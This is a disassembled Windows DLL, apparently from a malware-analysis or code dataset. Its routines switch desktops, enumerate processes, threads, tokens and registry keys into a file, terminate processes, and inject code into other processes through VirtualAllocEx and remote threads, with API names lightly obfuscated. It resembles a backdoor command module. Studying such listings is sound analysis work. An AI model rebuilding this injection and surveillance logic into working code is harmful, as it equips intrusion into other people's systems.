call [ CryptDestroyHash@IAT ]
sub_100049c0
sub esp 0x84
push esi
mov esi ecx
push edi
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0xd ]
mov [ esp + 0xc ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
call [ GetProcessWindowStation@IAT ]
test eax eax
mov [ esi + 0x8 ] eax
jne r-xdata
call [ GetCurrentThreadId@IAT ]
push eax
call [ GetThreadDesktop@IAT ]
test eax eax
mov [ esi ] eax
jne r-xdata
pop edi
pop esi
add esp 0x84
retn 0x4
push 0x37f
push 0x0
push rw-data
call [ OpenWindowStationA@IAT ]
test eax eax
mov [ esi + 0xc ] eax
jne r-xdata
pop edi
pop esi
add esp 0x84
retn 0x4
push eax
call [ SetProcessWindowStation@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
add esp 0x84
retn 0x4
mov eax [ esp + 0x90 ]
test eax eax
je r-xdata
pop edi
pop esi
add esp 0x84
retn 0x4
push 0x2000000
push 0x0
push 0x1
call [ OpenInputDesktop@IAT ]
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0xc ]
push ecx
push 0x80
mov edi eax
push edx
push 0x2
push edi
call [ GetUserObjectInformationA@IAT ]
push eax
lea eax [ esp + 0x10 ]
push eax
call [ lstrcpyA@IAT ]
mov edi [ esp + 0x8 ]
jmp r-xdata
push eax
call [ SetThreadDesktop@IAT ]
push edi
call [ CloseDesktop@IAT ]
pop edi
mov eax 0x1
pop esi
add esp 0x84
retn 0x4
push edi
call [ CloseDesktop@IAT ]
pop edi
xor eax eax
pop esi
add esp 0x84
retn 0x4
push 0x1ff
push 0x0
lea eax [ esp + 0x14 ]
push 0x0
push eax
call [ OpenDesktopA@IAT ]
test eax eax
mov [ esi + 0x4 ] eax
jne r-xdata
sub_10004af0
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
push eax
call [ SetProcessWindowStation@IAT ]
test eax eax
jne r-xdata
mov ecx [ esi ]
push ecx
call [ SetThreadDesktop@IAT ]
test eax eax
jne r-xdata
pop esi
retn
mov edx [ esi + 0xc ]
push edx
call [ CloseWindowStation@IAT ]
test eax eax
jne r-xdata
pop esi
retn
mov eax [ esi + 0x4 ]
push eax
call [ CloseDesktop@IAT ]
neg eax
sbb eax eax
pop esi
neg eax
retn
pop esi
retn
sub_10004b40
sub esp 0x138
lea eax [ esp ]
push ebx
push esi
mov esi [ esp + 0x148 ]
xor ebx ebx
push edi
mov edi [ esp + 0x148 ]
push ebx
push 0x40
push eax
push esi
push edi
call Toolhelp32ReadProcessMemory
cmp [ esp + 0xc ] 0x5a4d
jne r-xdata
mov eax ebx
mov edx [ esp + 0x48 ]
push ebx
lea ecx [ esp + 0x50 ]
push 0xf8
add edx esi
push ecx
push edx
push edi
call Toolhelp32ReadProcessMemory
mov eax [ esp + 0x4c ]
cmp eax 0x4550
mov eax [ esp + 0x80 ]
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x138
retn
sub_10004bc0
push ecx
mov eax [ esp + 0x8 ]
push esi
push edi
xor edi edi
push eax
push edi
push 0x410
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ecx
retn 0x8
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x10 ]
push ecx
push 0x4
push edx
push esi
call EnumProcessModules
test eax eax
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
push 0x104
push eax
push ecx
push esi
call GetModuleFileNameExA
test eax eax
jbe r-xdata
mov edi 0x1
sub_10004c20
sub esp 0x214
mov eax 0x100
push ebx
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] eax
mov eax [ esp + 0x21c ]
push esi
push edi
push eax
push 0x0
push 0x1f0fff
mov [ esp + 0x18 ] 0x0
mov esi 0x1
mov [ esp + 0x1c ] 0x200
call [ OpenProcess@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor esi esi
lea ecx [ esp + 0xc ]
push ecx
push 0x8
push edi
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
cmp edi 0xffffffff
je r-xdata
push eax
call ebx
mov eax [ esp + 0x10 ]
lea edx [ esp + 0x10 ]
push edx
mov edx [ esp + 0x10 ]
lea ecx [ esp + 0x24 ]
push eax
push ecx
push esi
push edx
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
add esp 0x214
retn 0xc
push edi
call ebx
mov edx [ esp + 0x22c ]
lea eax [ esp + 0x1c ]
lea ecx [ esp + 0x14 ]
push eax
push ecx
mov ecx [ esp + 0x230 ]
lea eax [ esp + 0x20 ]
push edx
mov edx [ esp + 0x2c ]
push eax
push ecx
push edx
push 0x0
call [ LookupAccountSidA@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
mov ebx [ CloseHandle@IAT ]
test eax eax
je r-xdata
sub_10004d00
push 0xffffffff
push sub_1006b0eb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x550
push ebx
push ebp
push esi
push edi
mov [ esp + 0x14 ] ecx
push 0x104
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
test ebx ebx
mov [ esp + 0x18 ] ebx
je r-xdata
mov ecx [ esp + 0x560 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x55c
retn
mov ecx 0x41
xor eax eax
mov edi ebx
lea edx [ esp + 0x148 ]
[ edi ]
mov ecx 0x40
lea edi [ esp + 0x149 ]
mov [ esp + 0x148 ] al
push ebx
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x14c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push eax
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push 0x80
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
push 0x1
push eax
and ecx 0x3
push 0x1
lea eax [ esp + 0x160 ]
push 0x40000000
push eax
[ edi ] [ esi ]
call sub_10002d60
mov ebp eax
add esp 0x20
cmp ebp 0xffffffff
jne r-xdata
xor eax eax
mov ecx 0xc5
lea edi [ esp + 0x24c ]
push eax
[ edi ]
push 0x2
mov [ esp + 0x18 ] 0xffffffff
call CreateToolhelp32Snapshot
mov edx eax
mov [ esp + 0x10 ] edx
mov ecx 0x49
xor eax eax
lea edi [ esp + 0x24 ]
mov [ esp + 0x20 ] 0x128
[ edi ]
lea ecx [ esp + 0x20 ]
mov [ esp + 0x568 ] 0x0
push ecx
push edx
call Process32First
test eax eax
je r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
jmp r-xdata
mov esi [ CloseHandle@IAT ]
push ebp
call esi
mov eax [ esp + 0x10 ]
cmp eax 0xffffffff
je r-xdata
mov ecx [ esp + 0x28 ]
test ecx ecx
jne r-xdata
mov eax ebx
push eax
call esi
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
lea edx [ esp + 0x20 ]
push edx
push eax
call Process32Next
test eax eax
je r-xdata
mov ebx [ WriteFile@IAT ]
mov ecx [ esp + 0x28 ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0x28 ]
lea eax [ esp + 0x454 ]
lea ecx [ esp + 0x350 ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push edx
call sub_10004c20
test eax eax
jne r-xdata
lea edi [ esp + 0x44 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea esi [ esp + 0x44 ]
mov edx ecx
lea edi [ esp + 0x24c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x20 ]
push ecx
lea ecx [ esp + 0x14 ]
call sub_100057a0
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x38 ]
lea edx [ esp + 0x1c ]
mov [ esp + 0x558 ] eax
push 0x0
push edx
lea eax [ esp + 0x254 ]
push 0x314
push eax
push ebp
mov [ esp + 0x570 ] ecx
call ebx
mov edx [ esp + 0x10 ]
lea ecx [ esp + 0x20 ]
push ecx
push edx
call Process32Next
test eax eax
je r-xdata
mov ecx 0x41
lea edi [ esp + 0x350 ]
[ edi ]
mov ecx 0x41
lea edi [ esp + 0x454 ]
[ edi ]
mov ebx [ esp + 0x18 ]
mov ecx [ esp + 0x28 ]
test ecx ecx
jne r-xdata
test eax eax
jne r-xdata
lea eax [ esp + 0x20 ]
lea ecx [ esp + 0x10 ]
push eax
call sub_100057a0
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x24c ]
lea edx [ esp + 0x24c ]
[ edi ]
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x14 ]
push edx
push eax
call sub_10004bc0
test eax eax
jne r-xdata
sub_10004fb0
push 0xffffffff
push sub_1006b10b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x484
push ebp
push esi
push edi
push 0x104
call [ malloc@IAT ]
mov edx eax
add esp 0x4
test edx edx
mov [ esp + 0x10 ] edx
je r-xdata
mov ecx [ esp + 0x490 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x490
retn 0x4
mov ecx 0x41
xor eax eax
mov edi edx
lea ebp [ esp + 0x38c ]
[ edi ]
mov ecx 0x40
lea edi [ esp + 0x38d ]
mov [ esp + 0x38c ] al
push edx
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebp
lea ebp [ esp + 0x390 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push eax
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push 0x80
mov esi edi
mov edi ebp
mov ebp ecx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
push 0x1
and ecx 0x3
push eax
[ edi ] [ esi ]
push 0x1
lea ecx [ esp + 0x3a4 ]
push 0x40000000
push ecx
call sub_10002d60
mov ebp eax
add esp 0x20
cmp ebp 0xffffffff
jne r-xdata
mov esi [ esp + 0x4a0 ]
mov [ esp + 0xc ] 0xffffffff
push esi
push 0xf
call CreateToolhelp32Snapshot
mov edx eax
mov [ esp + 0xc ] edx
mov ecx 0x49
xor eax eax
lea edi [ esp + 0x44 ]
mov [ esp + 0x40 ] 0x128
[ edi ]
lea eax [ esp + 0x40 ]
mov [ esp + 0x498 ] 0x0
push eax
push edx
call Process32First
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
push edx
call [ free@IAT ]
add esp 0x4
xor eax eax
jmp r-xdata
push rw-data
push rw-data
push 0x8
push rw-data
push 0x8
push rw-data
push ebp
call sub_10007930
mov ecx 0x88
xor eax eax
lea edi [ esp + 0x188 ]
add esp 0x1c
mov [ esp + 0x168 ] 0x224
lea edx [ esp + 0x168 ]
[ edi ]
mov eax [ esp + 0xc ]
push edx
push eax
call Module32First
test eax eax
je r-xdata
mov ecx [ esp + 0x48 ]
test ecx ecx
jne r-xdata
push rw-data
push ebp
call sub_10007930
mov ecx 0x6
xor eax eax
lea edi [ esp + 0x30 ]
add esp 0x8
mov [ esp + 0x24 ] 0x1c
lea edx [ esp + 0x24 ]
[ edi ]
mov eax [ esp + 0xc ]
push edx
push eax
call Thread32First
test eax eax
je r-xdata
mov eax [ esp + 0x178 ]
cmp eax 0xffff
jne r-xdata
test eax eax
je r-xdata
mov edx [ esp + 0xc ]
lea ecx [ esp + 0x40 ]
push ecx
push edx
call Process32Next
test eax eax
je r-xdata
mov esi [ CloseHandle@IAT ]
push ebp
call esi
mov eax [ esp + 0xc ]
cmp eax 0xffffffff
je r-xdata
cmp [ esp + 0x30 ] esi
jne r-xdata
push eax
push rw-data
push ebp
call sub_10007930
add esp 0xc
push rw-data
push ebp
call sub_10007930
add esp 0x8
jmp r-xdata
cmp [ esp + 0x48 ] esi
je r-xdata
mov ecx [ esp + 0x48 ]
test ecx ecx
jne r-xdata
mov eax [ esp + 0x10 ]
push eax
call esi
mov edx [ esp + 0xc ]
lea ecx [ esp + 0x24 ]
push ecx
push edx
call Thread32Next
test eax eax
jne r-xdata
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x38 ]
cmp ecx 0x10
lea eax [ edx + ecx ]
jge r-xdata
lea edx [ esp + 0x288 ]
push edx
mov edx [ esp + 0x184 ]
push edx
push eax
push ecx
push rw-data
push ebp
call sub_10007930
add esp 0x18
mov edx [ esp + 0x180 ]
lea eax [ esp + 0x288 ]
push eax
push edx
push rw-data
push 0x8
push ecx
push rw-data
push ebp
call sub_10007930
add esp 0x1c
jmp r-xdata
mov ecx [ esp + 0x17c ]
mov edx [ esp + 0x48 ]
push ecx
push edx
call sub_10004b40
mov ecx [ esp + 0x184 ]
add esp 0x8
cmp ecx eax
jne r-xdata
lea ecx [ esp + 0x64 ]
push ecx
push rw-data
push ebp
call sub_10007930
mov ecx [ esp + 0x18 ]
xor edx edx
add esp 0xc
mov [ esp + 0x18 ] edx
lea eax [ esp + 0x14 ]
mov [ esp + 0x1c ] edx
push eax
push ecx
xor esi esi
mov [ esp + 0x1c ] 0x10
mov [ esp + 0x28 ] edx
call Heap32ListFirst
test eax eax
je r-xdata
mov edx [ esp + 0xc ]
lea ecx [ esp + 0x40 ]
push ecx
push edx
call Process32Next
test eax eax
je r-xdata
lea eax [ esp + 0x40 ]
lea ecx [ esp + 0xc ]
push eax
call sub_100057a0
cmp ecx 0xf
jle r-xdata
cmp eax 0xf
jle r-xdata
mov ecx [ esp + 0xc ]
lea eax [ esp + 0x168 ]
push eax
push ecx
call Module32Next
test eax eax
jne r-xdata
mov ecx [ esp + 0x54 ]
mov edx [ esp + 0x5c ]
mov eax [ esp + 0x58 ]
push esi
push ecx
mov ecx [ esp + 0x50 ]
push edx
push eax
push ecx
push rw-data
push ebp
call sub_10007930
mov esi [ esp + 0x4bc ]
add esp 0x1c
mov eax [ esp + 0xc ]
lea edx [ esp + 0x14 ]
push edx
push eax
inc esi
call Heap32ListNext
test eax eax
jne r-xdata
mov ecx [ esp + 0x48 ]
test ecx ecx
jne r-xdata
cmp ecx 0x10
jge r-xdata
cmp eax 0x1f
jle r-xdata
mov eax 0xf
test eax eax
jne r-xdata
lea eax [ esp + 0x40 ]
lea ecx [ esp + 0xc ]
push eax
call sub_100057a0
cmp ecx 0xf
jle r-xdata
cmp eax 0x1
jge r-xdata
mov eax 0x1f
jmp r-xdata
push eax
mov eax [ esp + 0x30 ]
push eax
push rw-data
push ebp
call sub_10007930
add esp 0x10
cmp eax 0x10
jge r-xdata
mov eax 0x1
mov eax 0x10
sub_100053d0
mov eax [ esp + 0x4 ]
push esi
push eax
push 0x0
push 0x1
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
push 0x1
push esi
call [ TerminateProcess@IAT ]
push esi
mov edi eax
call [ CloseHandle@IAT ]
mov eax edi
pop edi
pop esi
retn 0x4
pop esi
retn 0x4
sub_10005410
mov eax 0x2030
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x2c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov cl [ esp + 0x18 ]
mov al [ esp + 0x2c ]
mov esi [ GetProcAddress@IAT ]
dec cl
mov [ esp + 0x18 ] cl
lea ecx [ esp + 0x18 ]
dec al
push ecx
push ebx
mov [ esp + 0x34 ] al
call esi
lea edx [ esp + 0x2c ]
mov ebp eax
push edx
push ebx
call esi
xor ecx ecx
mov [ esp + 0x14 ] eax
test eax eax
sete cl
xor edx edx
test ebp ebp
sete dl
or ecx edx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2030
retn 0x8
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x40 ]
mov esi rw-data
[ edi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x40 ]
mov ebx ecx
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov edx [ esp + 0x2048 ]
and ecx 0x3
xor eax eax
[ edi ] [ esi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
push ecx
lea ecx [ esp + ebx + 0x44 ]
push ecx
push edx
mov [ esp + 0x1c ] 0x0
call sub_100055e0
mov edx [ esp + 0x2050 ]
add esp 0xc
lea ebx [ ebx + eax + 0x1 ]
push edx
push 0x0
push 0x43a
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x2030
retn 0x8
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2030
retn 0x8
push 0x40
push 0x1000
push ebx
push 0x0
push esi
call [ VirtualAllocEx@IAT ]
mov edi eax
test edi edi
je r-xdata
push esi
call [ CloseHandle@IAT ]
push 0x0
lea eax [ esp + 0x44 ]
push ebx
push eax
push edi
push esi
call ebp
test eax eax
je r-xdata
test edi edi
je r-xdata
push 0x0
push 0x0
push 0x0
push edi
push 0x0
push 0x0
push esi
call [ esp + 0x30 ]
mov ebx eax
test ebx ebx
je r-xdata
push 0x8000
push 0x0
push edi
push esi
call [ VirtualFreeEx@IAT ]
push 0xffffffff
push ebx
call [ WaitForSingleObject@IAT ]
cmp eax 0xffffffff
je r-xdata
push ebx
call [ CloseHandle@IAT ]
mov [ esp + 0x10 ] 0x1
sub_100055e0
push ebx
mov ebx [ esp + 0x10 ]
push esi
xor esi esi
xor eax eax
test ebx ebx
jbe r-xdata
pop esi
pop ebx
retn
mov edx [ esp + 0x10 ]
push edi
mov edi [ esp + 0x10 ]
mov [ eax + edx ] 0x5f
inc eax
add cl 0x41
mov [ eax + edx ] cl
cmp cl 0x5f
jne r-xdata
mov cl [ esi + edi ]
xor cl 0x5e
mov [ eax + edx ] cl
je r-xdata
pop edi
inc esi
inc eax
cmp esi ebx
jb r-xdata
sub_10005620
push 0xffffffff
push sub_1006b128
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push esi
lea ecx [ esp + 0x4 ]
call sub_10004bb0
mov eax [ esp + 0x28 ]
mov [ esp + 0x1c ] 0x0
dec eax
cmp eax 0x4
ja r-xdata
mov [ esp + 0xc ] r--data
jmp [ eax * 4 + jump_table_1000577c ]
lea ecx [ esp + 0x4 ]
call sub_10004d00
mov esi eax
test esi esi
jne r-xdata
mov eax [ esp + 0x2c ]
lea ecx [ esp + 0x4 ]
mov eax [ eax ]
push eax
call sub_10004fb0
mov esi eax
test esi esi
jne r-xdata
mov eax [ esp + 0x2c ]
lea ecx [ esp + 0x4 ]
mov eax [ eax ]
push eax
call sub_100053d0
test eax eax
jne r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ eax ]
add eax 0x4
push eax
push ecx
lea ecx [ esp + 0xc ]
call sub_10005410
test eax eax
jne r-xdata
mov edx [ esp + 0x24 ]
lea ecx [ esp + 0x8 ]
push ecx
push edx
mov [ esp + 0x10 ] 0x3
mov [ esp + 0x18 ] esi
call sub_10003930
push esi
call sub_10002a70
push esi
call [ free@IAT ]
add esp 0x10
jmp r-xdata
call [ GetLastError@IAT ]
mov [ esp + 0xc ] eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov edx [ esp + 0x24 ]
lea ecx [ esp + 0x8 ]
push ecx
mov [ esp + 0xc ] 0x1
push edx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov ecx [ esp + 0x24 ]
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] 0x1
push ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ esp + 0xc ] eax
jmp r-xdata
lea ecx [ esp + 0x4 ]
call sub_10001750
mov ecx [ esp + 0x14 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x1c
retn
mov eax [ esp + 0x24 ]
lea edx [ esp + 0x8 ]
push edx
mov [ esp + 0xc ] 0x0
push eax
call sub_10003930
add esp 0x8
sub_100057a0
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
mov eax [ esi ]
push edi
push eax
call Process32Next
test eax eax
je r-xdata
pop edi
pop esi
retn 0x4
mov ecx [ edi + 0x8 ]
test ecx ecx
jne r-xdata
push edi
mov ecx esi
call sub_100057a0
sub_100057d0
sub esp 0x258
mov al [ rw-data ]
push ebx
push ebp
push esi
push edi
mov [ esp + 0x60 ] al
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x61 ]
lea edx [ esp + 0x58 ]
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0x4c ]
mov [ esp + 0x40 ] 0x104
stosb [ edi ]
push ecx
lea eax [ esp + 0x34 ]
push edx
lea ecx [ esp + 0x40 ]
push eax
lea edx [ esp + 0x40 ]
push ecx
lea eax [ esp + 0x64 ]
push edx
lea ecx [ esp + 0x70 ]
push eax
lea edx [ esp + 0x60 ]
push ecx
push edx
mov edx [ esp + 0x290 ]
lea eax [ esp + 0x60 ]
push 0x0
lea ecx [ esp + 0x84 ]
push eax
push ecx
push edx
call [ RegQueryInfoKeyA@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x258
retn 0x8
mov ebx [ esp + 0x26c ]
mov ebp [ WriteFile@IAT ]
xor edi edi
inc edi
test esi esi
je r-xdata
mov ecx [ esp + 0x2c ]
lea edx [ esp + 0x24 ]
mov [ esp + 0x1c ] eax
push eax
push edx
lea eax [ esp + 0x1c ]
push 0xc
push eax
push ebx
mov [ esp + 0x28 ] 0x11
mov [ esp + 0x2c ] ecx
call ebp
mov edx [ esp + 0x2c ]
lea ecx [ esp + 0x24 ]
push esi
push ecx
lea eax [ esp + 0x16c ]
push edx
push eax
push ebx
call ebp
lea eax [ esp + 0x4c ]
lea ecx [ esp + 0x2c ]
push eax
mov eax [ esp + 0x274 ]
push 0x0
push 0x0
push 0x0
lea edx [ esp + 0x174 ]
push ecx
push edx
push edi
push eax
mov [ esp + 0x4c ] 0x104
call [ RegEnumKeyExA@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x30 ]
mov esi [ malloc@IAT ]
inc edx
lea eax [ ecx + 0x1 ]
mov [ esp + 0x10 ] edx
push eax
mov [ esp + 0x24 ] eax
call esi
mov edi eax
add esp 0x4
test edi edi
je r-xdata
mov eax [ esp + 0x10 ]
push eax
call esi
mov esi eax
add esp 0x4
test esi esi
mov [ esp + 0x44 ] esi
jne r-xdata
mov eax [ esp + 0x34 ]
test eax eax
je r-xdata
push eax
call [ free@IAT ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x258
retn 0x8
mov esi [ free@IAT ]
push edi
call esi
mov ecx [ esp + 0x48 ]
push ecx
call esi
add esp 0x8
mov [ esp + 0x28 ] 0x0
jbe r-xdata
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x30 ]
inc ecx
lea eax [ esp + 0x10 ]
mov [ esp + 0x20 ] ecx
inc edx
push eax
mov eax [ esp + 0x2c ]
lea ecx [ esp + 0x40 ]
mov [ esp + 0x14 ] edx
push esi
push ecx
mov ecx [ esp + 0x27c ]
lea edx [ esp + 0x2c ]
push 0x0
push edx
push edi
push eax
push ecx
call [ RegEnumValueA@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x34 ]
inc eax
cmp eax ecx
mov [ esp + 0x28 ] eax
jb r-xdata
mov eax [ esp + 0x3c ]
cmp eax 0xb
ja r-xdata
mov [ esp + 0x14 ] 0x12
jmp [ eax * 4 + jump_table_10005a68 ]
mov eax [ esp + 0x10 ]
lea edx [ esp + 0x24 ]
push 0x0
push edx
push eax
push esi
push ebx
call ebp
lea ecx [ esp + 0x24 ]
push 0x0
push ecx
push eax
push edi
push ebx
call ebp
mov [ esp + 0x14 ] 0x3
jmp r-xdata
mov [ esp + 0x14 ] 0x4
jmp r-xdata
mov [ esp + 0x14 ] 0x5
jmp r-xdata
mov [ esp + 0x14 ] 0x2
jmp r-xdata
mov [ esp + 0x14 ] 0x6
jmp r-xdata
mov [ esp + 0x14 ] 0x7
jmp r-xdata
mov [ esp + 0x14 ] 0x0
jmp r-xdata
mov [ esp + 0x14 ] 0xb
jmp r-xdata
mov [ esp + 0x14 ] 0x1
jmp r-xdata
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x24 ]
mov [ esp + 0x18 ] edx
push 0x0
push ecx
lea edx [ esp + 0x1c ]
push 0xc
push edx
push ebx
mov [ esp + 0x30 ] eax
call ebp
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
sub_10005aa0
sub esp 0x20c
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x108 ]
push ebx
push esi
push edi
mov edi [ esp + 0x21c ]
[ edi ]
not ecx
sub edi ecx
push rw-data
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x118 ]
push ecx
call [ strstr@IAT ]
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
xor ebx ebx
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x114 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x114 ]
sub ecx edx
push ecx
lea ecx [ esp + 0x14 ]
push eax
push ecx
call [ strncpy@IAT ]
mov edi esi
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
dec ecx
lea edx [ esp + 0x10 ]
sub edx ecx
lea edi [ esp + 0x114 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov [ edx + ecx ] al
lea edi [ esp + 0x114 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x10 ]
mov eax ecx
mov esi edi
mov edi edx
mov ebx 0x1
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x14 ]
push rw-data
push ecx
call esi
add esp 0xc
test eax eax
jne r-xdata
test ebx ebx
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov esi [ strncmp@IAT ]
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x10 ]
push ecx
push rw-data
push eax
call esi
add esp 0xc
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push edx
call esi
add esp 0xc
test eax eax
jne r-xdata
test ebx ebx
je r-xdata
mov edx 0x80000000
jmp r-xdata
pop edi
pop esi
mov eax 0x80000000
pop ebx
add esp 0x20c
retn
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x10 ]
push ecx
push rw-data
push eax
call esi
add esp 0xc
test eax eax
jne r-xdata
test ebx ebx
je r-xdata
mov edx 0x80000001
jmp r-xdata
pop edi
pop esi
mov eax 0x80000001
pop ebx
add esp 0x20c
retn
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
lea ebx [ esp + 0x10 ]
[ edi ]
not ecx
dec ecx
lea edi [ esp + ecx + 0x115 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x14 ]
push rw-data
push ecx
call esi
add esp 0xc
test eax eax
jne r-xdata
test ebx ebx
je r-xdata
mov edx 0x80000002
jmp r-xdata
pop edi
pop esi
mov eax 0x80000002
pop ebx
add esp 0x20c
retn
mov eax [ esp + 0x220 ]
lea ecx [ esp + 0xc ]
push ecx
push eax
lea ecx [ esp + 0x18 ]
push 0x0
push ecx
push edx
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
mov eax edx
pop ebx
add esp 0x20c
retn
pop edi
pop esi
or eax 0xffffffff
pop ebx
add esp 0x20c
retn
test ebx ebx
je r-xdata
mov edx 0x80000003
